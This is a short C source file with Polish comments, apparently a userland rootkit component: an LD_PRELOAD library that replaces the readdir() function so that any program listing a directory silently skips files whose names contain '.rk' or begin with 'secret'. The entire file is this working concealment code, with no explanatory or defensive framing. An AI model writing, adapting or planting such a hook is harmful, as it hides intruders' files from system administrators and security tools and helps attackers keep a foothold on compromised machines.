
#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>
#include <stdio.h>

// Wskaźnik do oryginalnej funkcji readdir
static struct dirent *(*orig_readdir)(DIR *dirp) = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
    }
    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (strstr(entry->d_name, ".rk") != NULL ||
            strncmp(entry->d_name, "secret", 6) == 0) {
            continue; // Pomijamy
        }
        return entry;
    }
    return NULL;
}
